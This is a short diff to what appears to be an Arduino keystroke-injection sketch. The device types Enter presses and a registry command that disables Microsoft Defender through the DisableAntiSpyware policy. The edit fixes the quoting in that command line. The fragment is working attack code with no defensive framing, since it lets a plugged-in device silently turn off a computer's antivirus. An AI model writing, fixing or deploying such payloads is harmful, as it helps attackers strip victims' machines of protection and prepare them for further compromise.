@@ -27,7 +27,7 @@ void setup() {
    delay(600);
    Keyboard.release(KEY_RETURN);
    delay(600); 
-   Keyboard.println("reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f");
+   Keyboard.println("reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f");
    delay(600);
    Keyboard.press(KEY_RETURN);
    delay(600);
